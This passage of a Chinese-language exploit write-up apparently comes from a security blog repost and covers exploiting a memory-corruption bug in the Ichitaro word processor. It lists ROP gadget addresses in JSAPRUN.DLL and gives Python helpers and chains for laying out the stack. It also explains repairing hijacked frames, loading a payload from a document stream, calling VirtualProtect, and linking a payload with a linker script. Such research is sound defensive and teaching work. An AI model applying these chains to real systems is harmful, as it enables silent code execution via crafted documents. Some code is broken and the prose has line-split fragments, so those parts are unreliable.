JSAPRUN.DLL     0x61048954: add esp, dword ptr [ecx - 0x18]; dec edi; ret; 
JSAPRUN.DLL     0x610a0265: add esp, dword ptr [ecx - 0x18]; dec edx; clc; call dword ptr [ecx + 0x56]; 
JSAPRUN.DLL     0x610a13c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [eax]; clc; call dword ptr [ecx + 0x56]; 
JSAPRUN.DLL     0x6108d2c6: add esp, dword ptr [ecx - 0x18]; fnstsw word ptr [ecx - 7]; call dword ptr [ecx - 0x7d]; 
JSAPRUN.DLL     0x61037b04: add esp, dword ptr [ecx - 0x18]; lahf; sar esi, 1; call dword ptr [ecx + 0x68];
JSAPRUN.DLL     0x61029acd: add esp, dword ptr [ecx - 0x18]; salc; mov cl, 0xff; call dword ptr [ecx + 0x56]
```  
  
  
**指令序列重用的概括**  
  
当将加载任意代码所需的块放在一起时，每个序列都包含一个导致所述块的必要性的副作用，以及一个确定可以从中继续执行的方法的属性。对于第二个属性，指令序列只能通过几种方式继续执行。  
  
  
第一种方法通常被认为是面向返回的编程，并且需要控制驻留在堆栈帧内的内存。第二种方法涉及分支指令和立即数寄存器的组合，需要对寄存器进行运算和控制才能继续执行。第三种方法涉及解引用和分支指令。该方法需要控制与寄存器相关的地址或引用目标地址空间内的全局的分支以及控制所述存储器位置。还有第四种方法涉及运行时或操作系统提供的设施，但是，该方法尚未在提供的漏洞利用中进行探索。  
  
  
利用这些方法中的每一个所必需的两种类型的分支是保留分支，它保留当前执行范围的某些方面，或者直接分支，它要么丢弃当前范围，要么对当前范围没有任何影响。一般来说，区分所需序列是否可以从先前执行的块继续的主要特征依赖于它在进入和退出时如何影响堆栈指针。这是堆栈指针的结果，本质上，在影响堆栈指针的指令方面具有与指令指针类似的特征。  
  
  
基于这些假设，包含序列偏移量的表（包含利用过程中所利用的必要副作用）会跟踪两条数据。第一个是每个块整体的堆栈增量（如果序列直接影响堆栈指针，则不包括堆栈增量）。第二条数据涉及在代码块继续执行其后续序列之后可以应用于堆栈指针的任何调整。  
  
  
根据这两个数据，可以使用以下 Python 代码将序列链接在一起的过程与将必要的副作用放在一起以利用代码执行的过程隔离。通过实现这种抽象，这具有简化堆栈布局过程的效果，使实现者能够以更好地面向可重用性的方式将代码序列组合在一起。  
  
```
class StackReceiver(object):
    def __init__(self, receiver):
        self._receiver = receiver
        self._state = coro = self.__sender(receiver)
        next(coro)
 
    def sender(self, receive_word):
        release = None
        while True:
            while not release:
                offset = (yield)
                receive_word(offset)
                adjust = (yield)
                if adjust and isinstance(adjust, (tuple, list)):
                    [receive_word(integer) for integer in adjust]
                elif adjust:
                    receive_word(dyn.block(adjust)))
                release = (yield)
 
            offset = (yield)
            receive_word(offset)
            if isinstance(release, (tuple, list)):
                [receive_word(integer) for integer in release]
            else:
                receive_word(dyn.block(release))
 
            adjust = (yield)
            if adjust and isinstance(adjust, (tuple, list)): 
                [receive_word(integer) for integer in adjust]
            elif adjust:
                receive_word(dyn.block(adjust)))
                
            release = (yield)
        return
 
    def send(self, snippet, *integers):
        '''Simulate a return.'''
        state = self._state
        offset, adjust, release = snippet
        state.send(offset)
        state.send(integers if integers else adjust)
        state.send(release)
 
    def call(self, offset, *parameters):
        '''Simulate a call.'''
        state = self._state
        offset, adjust, release = offset if isinstance(offset, (tuple, list)) else (offset, 0, 0)
        state.send(offset)
        state.send(None)
        state.send(parameters)
 
    def skip(self, count):
        '''Clean up any extra parameters assumed by the current calling convention.'''
        state = self._state
        if count:
            state.send(0)
            state.send([0] * (count - 1)) if count > 1 else state.send(None)
            state.send(None)
        return
 
### Example usage
layout = []
stack = StackReceiver(layout.append)
 
# assign %eax with the delta from our original frame to &lp_oframe_230 or &ap_oframe_0.
# this way we can dereference it to get access to the contents of the object_OFRM.
delta_oframe = scope_pivot['F3C1FAF0F']['ap_oframe_0'].getoffset() - scope_pivot['F3BBB2DE4'][' s'].getoffset()
delta_oframe = scope_pivot['F3C1FAF0F']['lp_oframe_230'].getoffset() - scope_pivot['F3BBB2DE4'][' s'].getoffset()
 
stack.send(JSAPRUN.assign_pop_eax, delta_oframe)
stack.send(JSAPRUN.arithmetic_add_ebp_eax)
 
# now we can dereference %eax to point at the object_OFRM representing our document.
stack.send(JSAPRUN.assign_pop_esi, 0)
stack.send(JSAPRUN.arithmetic_addload_eax_esi)
stack.send(JSAPRUN.assign_esi_eax, 0)
 
# adjust %eax by +4 so that we can load the value from object_OFRM.v_index_4 into %esi.
# the integer at this index is a handle and is all we need to create a fake object_OFRM.
stack.send(JSAPRUN.arithmetic_add_imm4_eax)
stack.send(JSAPRUN.assign_pop_esi, 0)
stack.send(JSAPRUN.arithmetic_addload_eax_esi)
 
...
 
# stash %ecx containing our context into %ebx for the purpose of preserving our context.
# this way we can restore it later from %ebx to regain access to our current state.
stack.send(JSAPRUN.assign_ecx_eax)
stack.send(JSAPRUN.exchange_eax_ebx)
 
# void *__thiscall JSAPRUN.dll!method_mallocPageAndSurplus_7ebee(_DWORD *this, size_t av_size_0)
# this function allocates a page (0x1000) and writes it to 0x24(%ecx). if av_0 > 0x1000, then it
# also returns a pointer to that number of bytes and does nothing else.
stack.call(JSAPRUN.procedure_method_mallocPageAndSurplus_7ebee, 0x1001, 0x11111111)
stack.send(JSAPRUN.arithmetic_add_imm4_esp)
 
...
 
# open up a stream by its name, layout.frame.stream_name. %ecx contains our fake object_OFRM.
new_context = layout['context']['object(OSEG)']
assert(not(divmod(new_context.int() - layout['context'].getoffset(), 4)[1])), "Result {:s} is unaligned from {:s} and will not be accessible".format(layout['context']['object(OSEG)'].instance(), layout['context'].instance())
stack.send(JSAPRUN.assign_pop_eax, layout['object_OFRM.vftable'].getoffset())
# int __stdcall object_OFRM::method_openStream_2b5c5(JSVDA::object_OFRM *ap_this_0, wchar_t *ap_streamName_4, int a_unused_8, char avb_flags_c, int a_unused_10, JSVDA::object_OSEG **ap_result_14)
stack.send(JSAPRUN.callsib1_N_eax_c__ecx, layout['frame']['stream_name'].getoffset(), 0x22222222, 3, 0x33333333, new_context.getoffset())
 
# copy the %ebx containing our context back into %ecx.
stack.send(JSAPRUN.assign_pop_ecx, 0)
stack.send(JSAPRUN.exchange_eax_ebx)
stack.send(JSAPRUN.arithmetic_add_eax_ecx)
stack.send(JSAPRUN.exchange_eax_ebx)
```  
  
  
围绕这个概念开发了更多抽象，以实现更大的灵活性，例如标记堆栈上相对于另一个代码块的特定槽，然后使用先前序列的副作用从该槽加载值或将值存储到该槽。通过将第二或第三执行保留方法与保留分支指令相结合，可以实现原始循环构造，而无需通过模拟跳转表进行条件分支。这对于每个序列处理的数据量具有非静态长度并且取决于仅在运行时可用的值的情况很有用。  
  
```
class ReceiverMarker(StackReceiver):
    '''Experimental class for referencing a specific slot within the stack and marking the snippet where the slot is referenced.'''
    def __init__(self):
        self._collected = collected = []
        super(ReceiverMarker, self).__init__(collected.append)
        self._marked = []
 
    def use(self, snippet, *integers):
        '''Mark the specified snippet where a slot should be calculated from.'''
        self.send(snippet, *integers)
        self._marked = self._collected[:]
 
class Stacker(StackReceiver):
    '''Experimental class for referencing a specific slot within the stack to be either read from or written to.'''
    def __init__(self, stack):
        super(Stacker, self).__init__(stack.append)
        self._stack = stack
 
    @contextlib.contextmanager
    def reference(self, snippet, *integers, **index):
        '''Reference a slot within the stack and use it as a parameter to the specified snippet.'''
        marker = ReceiverMarker()
        try:
            abort = None
            yield marker
        except Exception as exception:
            abort = exception
        finally:
            if abort: raise abort
 
        # build the stack containing the entire contents that were collected.
        tempstack = parray.type(_object_=ptype.pointer_t).a
        [ tempstack.append(item) for item in marker._collected ]
 
        # build the stack that was marked by the caller.
        markstack = parray.type(_object_=ptype.pointer_t).a
        [ markstack.append(item) for item in marker._marked ]
 
        # build the stack that is being used to adjust towards a specific index.
        adjuststack = parray.type(_object_=ptype.pointer_t)
        adjuststack = adjuststack.alloc(length=index.get('index', 0))
 
        # push the caller's requested instruction onto the stack using the size that was marked.
        state = self._state
        offset, adjust, release = snippet
        state.send(offset)
        items = [item for item in integers]
        state.send(items + [tempstack.size() - markstack.size() + adjuststack.size()])
        state.send(release)
 
        # now we can push all of the elements that the caller wanted onto the stack.
        Freceive = self._receiver
        [ Freceive(item) for item in tempstack ]
```  
  
  
以下列表是前面提到的抽象的使用示例。  
  
```
# load the page from layout.vprotect.dynamic_buffer into %edi which was written to 0x24(%ecx) earlier.
stack.send(JSAPRUN.assign_pop_eax, divmod(layout['vprotect']['dynamic_buffer'].getoffset() - layout['context'].getoffset(), 4)[0])
stack.send(JSAPRUN.load_slotX_eax_eax)
stack.send(JSAPRUN.exchange_eax_edi)
stack.send(JSAPRUN.return_0)
 
# now we write %edi directly into slot 1 of whatever follows us.
with stack.reference(JSAPRUN.assign_pop_eax, index=1) as store:
    store.use(JSAPRUN.store_edi_sib1_eax_esp_0)     # mark the index from this stack position
    store.send(JSAPRUN.assign_pop_eax, layout['object_OSEG.vftable'].getoffset() - layout['context'].getoffset())
    store.send(JSAPRUN.arithmetic_add_eax_ecx)
 
    # adjust %ecx to move from layout.context to layout.object_OSEG.vftable so
    # that we can eventually call 8(%ecx) later to read from the opened stream.
    delta_object_oseg = layout['context']['object(OSEG)'].getoffset() - layout['object_OSEG.vftable'].getoffset()
    assert(not(delta_object_oseg % 4)), "{:s} is not aligned from {:s} and will be inaccessible.".format(layout['context']['object(OSEG)'].instance(), layout['object_OSEG.vftable'].instance())
    store.send(JSAPRUN.assign_pop_eax, divmod(delta_object_oseg, 4)[0])
    store.send(JSAPRUN.load_slotX_eax_eax)
 
# "store.use" overwrites index 0+1, 0xBBBBBBBB, in the following sequence.
# int __stdcall object_OSEG::method_read_2c310(JSVDA::object_OSEG *ap_object_0, BYTE *ap_buffer_8, int av_size_c, int *ap_resultSize_c)
stack.send(JSVDA.callsib1_N_ecx_8__eax__ecx, 0xBBBBBBBB, 0x1000, layout['unused_result'].getoffset())
 
# calling object_OSEG::method_read_2c310 cleans up all args, but prior
# sequence misses 1.. which we take care of here.
stack.skip(1)
```  
  
  
**修复框架**  
  
在上一节中，我们结合了我们开发的所有功能，可以使用从包含漏洞的流中读取的数据完全控制当前线程的执行。我们还成功开发了一种方法，使我们能够连续执行多个指令序列。通常这应该足够了，但是，当我们控制指令指针时，属于文档的所有流都已完全超出范围。  
  
  
另一件值得关注的事情是，我们使用了对帧指针的控制来交换负责引用文档内容的唯一对象的虚拟方法表。这会导致我们在执行时完全无法访问文档，并阻止我们在完成后返回到应用程序。但是，如果我们可以修复框架并重新创建应用程序应该完成文档流解析时范围内的对象，我们就可以避免这种情况。  
  
  
因此，下一步要求我们找到一种恢复访问文档内容的功能的方法。幸运的是，我们可以使用存储在寄存器中的帧指针%ebp来访问调用者的帧。这允许我们将其用作参考点并访问堆栈中之前的任何信息。因此，当我们使用执行先前加载的指令序列的能力时，我们将需要保留该寄存器，因为它是进入应用程序原始堆栈的唯一网关。  
  
  
在执行序列期间，我们还可以使用  
%ecx在修改帧指针时控制的 about 寄存器。这可以用作访问或存储利用我们的漏洞创建的伪造对象的任何信息的参考点。还值得考虑的是，应用程序的调用约定在执行不同的函数时会保留寄存器。因此，当序列满足我们的需求后分派回进程时， 、 和 寄存器也可用于保存我们需要的任何  
%ebx值  
%esi。  
%edi  
  
  
查看调用伪造对象的虚拟方法时的调用堆栈表明，我们距我们劫持其帧的函数有 4 个帧。因此，如果我们想要访问这些框架的任何内容，我们将需要知道这些框架的大小。下图显示了每个框架及其大小。在此图中，寄存器内的帧指针%ebp保存在  
object_OFRM::openStreamByName?_132de4at的帧中0x3BBB2DE4，并引用调用堆栈上方并保存在  
object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76beat的函数中的帧指针  
0x3BE276BE。  
  
```
# Assign the path through the backtrace that ends up dereferencing from our virtual method table.
Python> backtrace = [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f]
 
Python> pp(listmap(func.name, backtrace))
['object_OFRM::openStreamByName?_132de4',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
 'object_9c2044::method_processStreams_77af0f']
 
# Grab the frame members for each function in the backtrace in order to study their layout.
Python> layout = struc.right(func.frame(backtrace[-1]), [func.frame(f) for f in backtrace[:-1]])
 
# Display each of the frames.
Python> pp(layout)
[<class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>,
 <class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>,
 <class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>,
 <class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>]
 
# List the location of each preserved frame pointer in our callstack.
Python> [(print(frame), frame.list(' *')) for frame in layout]
<class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>
[2]  -33c:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[3]  -338:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
<class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>
[25] -298:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[26] -294:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
<class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>
[0]  -278:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[1]  -274:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
<class 'structure' name='$ F3C1FAF0F' offset=-0x264 size=0x278>
[ 9]   -8:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[10]   -4:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
```  
  
  
在执行期间存储帧指针的状态后，我们使用它立即修复在 at 堆栈中被劫持的帧  
object_9c2044::method_processStreams_77af0f指针  
0x3C1FAF0F。由于我们知道帧指针的原始值是什么，因此我们可以在用漏洞覆盖原始帧指针之前添加原始帧指针的计算之间的距离。  
  
```
# Owner of the frame pointer that we have access to.
Python> func.name(func.by(layout[0]))
'object_OFRM::openStreamByName?_132de4'
 
Python> layout[0].members.list(' *')
[2] -33c:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[3] -338:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 
# Owner of the frame pointer that we've overwritten.
Python> func.name(func.by(layout[-1]))
'object_9c2044::method_processStreams_77af0f'
 
Python> layout[-1].members.list(' *')
[ 9] -8:+0x4 char[4] ' s' [(<class 'int'>, 1), 4]
[10] -4:+0x4 char[4] ' r' [(<class 'int'>, 1), 4]
 
# Calculate the delta between both of these locations.
Python> layout[-1].members.by(' s').offset - layout[0].members.by(' s').offset
0x334
```  
  
  
s这是通过获取帧中的“ ”字段  
0x3BBB2DE4（我们覆盖的帧指针值）与  
s帧中的“ ”字段  
0x3C1FAF0F（覆盖帧指针之前的正确值）之间的差异来完成的。这个计算的结果是0x334字节，我们只需要将这个值与寄存器中当前帧指针相加  
%ebp即可确定正确的值。  
  
  
我们还需要进行类似的计算来找到已被覆盖的保存的帧指针，以便我们向其写入正确的值。这在下面的清单中得到了证明。我们需要使用  
sframe 中的“”字段  
0x3C1FAF0F，而不是使用sframe 中的“”字段  
0x3BE26CB2。然后，校正被覆盖的帧指针的距离计算为  
+0xC4。利用这两个值，我们可以在完成目标后完全修复框架并将应用程序返回到修改之前的状态。  
  
```
# Display the layout that we'll be examining.
Python> pp(layout[:-1])
[<class 'structure' name='$ F3BBB2DE4' offset=-0x344 size=0x20>,
 <class 'structure' name='$ F3BE276BE' offset=-0x324 size=0xa8>,
 <class 'structure' name='$ F3BE26CB2' offset=-0x27c size=0x18>]
 
Python> pp(listmap(func.name, map(func.by, layout[:-1])))
['object_OFRM::openStreamByName?_132de4',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2']
 
# Identify the two members that we will need to use to locate the frame pointer
# that we will need to overwrite in order to repair the call stack.
Python> pp((layout[0].members.by(' s'), layout[2].members.by(' s')))
(<member '$ F3BBB2DE4. s' index=2 offset=-0x33c size=+0x4 typeinfo='char[4]'>,
 <member '$ F3BE26CB2. s' index=0 offset=-0x278 size=+0x4 typeinfo='char[4]'>)
 
# Calculate the difference between the current frame pointer, and the preserved
# frame pointer that we will overwrite.
Python> layout[0].members.by(' s').offset - layout[2].members.by(' s').offset
-0xc4
```  
  
  
**加载流的内容**  
  
修复帧后，我们仍然需要某种方式将有效负载加载到地址空间中，将其标记为可执行文件，然后执行它。由于我们在包含漏洞的流被应用程序关闭后劫持了执行，因此我们需要一些其他方法来加载我们的代码。幸运的是，由于我们可以访问流解析的范围，因此我们可以重用堆栈中可用的任何内容来执行此操作。这是可能的，因为JSVDA.DLL包含与文档对象交互的必要功能的模块位于已知地址，并且文档作为单个句柄存储在应用程序中。因此，只需要对象的句柄及其虚拟方法表来伪造我们自己的文档对象实例，并且我们需要引用它来恢复从文档读回应用程序的能力。  
  
  
重新访问包含文档解析器范围的调用堆栈到我们劫持执行的位置，我们需要保存的帧指针与包含文档对象的  
object_9c2044::method_processStreams_77af0f函数的帧内字段之间的距离。  
0x3C1FAF0F在下面的清单中，该字段包含从其调用者传入的  
ap_oframe_0类型的文档对象，然后框架中的局部变量为该方法维护它的副本。一旦我们计算出当前帧指针与这些对象之一的位置之间的距离，我们就可以简单地从其属性列表中加载该对象的句柄，然后在任何地方使用它来访问所加载文档的内容。  
JSVDA::object_OFRMlp_oframe_230  
  
```
Python> callstack = [0x3bbb2de4, 0x3be276be, 0x3be26cb2, 0x3c1faf0f]
Python> pp(listmap(func.name, callstack))
['object_OFRM::openStreamByName?_132de4',
 'object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be',
 'object_9c2044::parseStream(DocumentEditStyles)_3a6cb2',
 'object_9c2044::method_processStreams_77af0f']
 
# Convert our callstack into a list of frames.
Python> layout = struc.right(func.frame(callstack[-1]), listmap(func.frame, callstack[:-1]))
 
# List all frame variables that have a type.
Python> layout[-1].list(typed=True)
[ 4] -254:+0x18  frame_77af0f::field_24c 'lv_struc_24c'      <class 'structure' name='frame_77af0f::field_24c' offset=-0x254 size=0x18>
[ 6] -238:+0x4       JSVDA::object_OFRM* 'lp_oframe_230'     (<class 'type'>, 4)
[ 7] -234:+0x228           object_2f27f8 'lv_object_22c'     <class 'structure' name='object_2f27f8' offset=-0x234 size=0x228>
[11]    0:+0x4       JSVDA::object_OFRM* 'ap_oframe_0'       (<class 'type'>, 4)
[12]    4:+0x4              unsigned int 'av_documentType_4' (<class 'int'>, 4)
[13]    8:+0x4              unsigned int 'av_flags_8'        (<class 'int'>, 4)
[14]    c:+0x4             struc_79aa9a* 'ap_stackobject_c'  (<class 'type'>, 4)
[15]   10:+0x4                       int 'ap_null_10'        (<class 'int'>, 4)
 
# List all frame variables that reference the object used to read from an opened document.
Python> layout[-1].list(structure=struc.by('JSVDA::object_OFRM'))
[ 6] -238:+0x4 JSVDA::object_OFRM* 'lp_oframe_230' (<class 'type'>, 4)
[11]    0:+0x4 JSVDA::object_OFRM* 'ap_oframe_0'   (<class 'type'>, 4)
```  
  
  
在漏洞利用中，我们利用漏洞将伪造对象的虚拟方法表的地址存储在内存中。因此，要完成该对象，我们只需将从调用堆栈更上方加载的文档对象中的句柄写入到虚拟方法表之后的正确位置即可。此时，我们可以调用它的任何方法来使用它的副本。以下清单是该对象的简单布局。  
  
```
Python>struc.search('*_OFRM').members
<class 'structure' name='JSVDA::object_OFRM' size=0x8>  # [alloc.tag] OFRM
[0] 0+0x4 int 'p_vftable_0' (<class 'int'>, 4)          # [vftable] 0x278186F0
[1] 4+0x4 int 'v_index_4'   (<class 'int'>, 4)          # {'note': 'object_117c5 handle', 'alloc.tag': 'MFCM'}
```  
  
  
之后，其余过程就很简单了。为了分配内存页，我们在同一模块中使用另一种方法。我们将原始虚拟方法表复制回伪造的对象中，然后重用它以从文件中打开任意流并返回该流的另一个对象。使用此流对象，我们将打开的流的内容读取到分配的内存页中。  
  
  
为了使分配的内存页可执行，我们在同一模块中重用一个围绕其中一个导入的包装器来调用“   
VirtualProtect”。最后，我们调用已加载代码的存根来初始化有效负载并分支到其真正的入口点。一旦有效负载完成执行并返回给我们，我们就设置一个成功的返回代码，以便函数  
0x3C1FAF0F相信流已成功解析。此时，我们的有效负载已在后台成功执行，并且应用程序已完全呈现文档。  
  
  
**使用编译器**  
  
将所需代码加载到地址空间的过程完成后，通常会公开同意直接包含“shellcode”以在被利用进程的上下文中维持执行。 Shellcode 涉及生成或手写的汇编代码，用于演示执行控制。或者，可以简单地利用开源编译器工具以具有更高级别抽象的语言来实现其有效负载。然而，这不仅限于闭源编译器，因为可以在链接代码的入口点实现一个带有存根的基本链接器，该存根负责对其数据应用必要的重定位，然后加载最终的有效负载。这与 Stephen Fewer 的反射 DLL 注入技术没有什么不同。  
  
  
以下链接器脚本可与 GNU 链接器 (ld) 的 MinGW 端口一起使用，以发出可加载到进程上下文中的连续二进制文件。此链接器脚本将入口点与需要映射为可执行文件的连续页面以及需要映射为可写的页面隔离。正确映射数据和可执行代码后，实现者将需要应用  
__load_size存储在  
__load_reloc_start和  
__load_reloc_stop符号之间的重定位。如果链接目标中包含导入，则这些导入最终将存储在  
__load_import_start和  
__load_import_end符号之间。  
  
```
ENTRY(_start)
STARTUP(src/entry.o)
TARGET(pe-i386)
 
SECTIONS {
    HIDDEN(_loc_counter = .);
    HIDDEN(_loc_align = 0x10);
 
    .load _loc_counter : {
        __load_start = ABSOLUTE(.);
        KEEP(*(.init))
        KEEP(*(.fini))
        . = ALIGN(_loc_align);
 
        __load_size = .; LONG(__load_end - __load_start);
        __load_segment_start = .; LONG(__segment_start);
        __load_segment_end = .; LONG(__segment_end);
        __load_reloc_start = .; LONG(__reloc_start);
        __load_reloc_end = .; LONG(__reloc_end);
        __load_import_start = .; LONG(__import_start);
        __load_import_end = .; LONG(__import_end);
 
        __load_end = ABSOLUTE(.);
        . = ALIGN(_loc_align);
    }
    _loc_counter += SIZEOF(.load);
 
    .imports _loc_counter : {
        __import_size = ABSOLUTE(.); LONG(__import_end - __import_start);
        __import_start = ABSOLUTE(.);
        *(.idata)
        *(SORT_BY_NAME(.idata$*))
        __import_end = ABSOLUTE(.);
 
        . = ALIGN(_loc_align);
    }
    _loc_counter += SIZEOF(.imports);
 
    __segment_start = ABSOLUTE(.);
 
    .text _loc_counter : {
        *(.text)
        *(SORT_BY_NAME(.text$*))
        *(.text.*)
        . = ALIGN(_loc_align);
 
        __CTOR_LIST__ = ABSOLUTE(.);
        LONG((__CTOR_END__ - __CTOR_LIST__) / 4 - 2);
        KEEP(*(.ctors));
        KEEP(*(.ctor));
        KEEP(*SORT_BY_NAME(.ctors.*));
        LONG(0);
        __CTOR_END__ = ABSOLUTE(.);
 
        __DTOR_LIST__ = ABSOLUTE(.);
        LONG((__DTOR_END__ - __DTOR_LIST__) / 4 - 2);
        KEEP(*(.dtors));
        KEEP(*(.dtor));
        KEEP(*SORT_BY_NAME(.dtors.*));
        LONG(0);
        __DTOR_END__ = ABSOLUTE(.);
 
        . = ALIGN(_loc_align);
    }
    _loc_counter += SIZEOF(.text);
 
    .data _loc_counter : {
        *(.data)
        *(SORT_BY_NAME(.data$*))
        *(.data.*)
        *(.*data)
        *(.*data.*)
 
        . = ALIGN(_loc_align);
    }
    _loc_counter += SIZEOF(.data);
 
    __segment_end = ABSOLUTE(.);
 
    .relocations _loc_counter : {
        __reloc_size = ABSOLUTE(.); LONG(__reloc_end - __reloc_start);
        __reloc_start = ABSOLUTE(.);
        *(.reloc)
        __reloc_end = ABSOLUTE(.);
 
        . = ALIGN(_loc_align);
    }
    _loc_counter += SIZEOF(.relocations);
 
    .bss (NOLOAD) : {
        *(.bss)
        *(COMMON)
    }
 
    .discarded (NOLOAD) : {
        *(.*)
    }
 
    __end__ = _loc_counter;
}
```  
  
  
通过实现将所选段映射到内存所需的逻辑并应用必要的重定位，可以完全避免对平台运行时链接器的依赖。之后，实现者可以初始化所需语言的运行时，并使用更能满足其需求的语言开发更复杂的有效负载。  
  
  
或者，如果实现者更喜欢使用闭源编译器作为其有效负载，则该漏洞还包含用于 PECOFF 对象和存档格式的链接器。该链接器将获取输入文件列表并发出二进制数据块，当利用漏洞执行该数据块时，将加载并执行已实现的有效负载。  
  
  
**整理起来**  
  
当我们加载的代码成功执行后，我们只需要将寄存器设置  
%eax为正确的值来告诉调用者要么无法打开流，要么已经成功打开。分配结果后，我们需要使用常规的帧指针退出来离开被劫持的函数并恢复执行，就像什么都没发生一样。下面的两个地址就可以做到这一点。由于被劫持的帧指针在执行我们的有效负载之前已被修复，因此应用程序将继续尝试解析和加载文档的其余内容，就好像没有发生任何可怕的事情一样。  
  
```
JSAPRUN.DLL    0x6100e5cf: pop eax; ret;
JSAPRUN.DLL    0x6100104f: leave; ret;
```  
  
  
**结论**  
  
当谈到利用现代操作系统上的内存损坏漏洞时，通用利用技术的时代早已一去不复返了。开发技术是特定于应用程序的，开发它们需要对其内部工作原理有更深入的了解，而由于高级语言的抽象，原始开发人员通常不知道这些工作原理。虽然交互式执行环境或脚本语言的存在提供了几乎无限的利用灵活性，但在像 Ichitaro 的环境中，利用开发人员必须将许多不同的副作用链接在一起才能实现一次性利用。  
  
  
在所展示的案例中，单个漏洞被滥用，最终实现了任意代码执行。当漏洞利用需要链接多个漏洞时，情况通常并非如此。这通常使得判断单个漏洞的严重性变得困难，但是像这里介绍的那样的利用演示开发了一个等价类，使我们能够做出明智的决策，而无需演示每个实例的利用情况。   
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
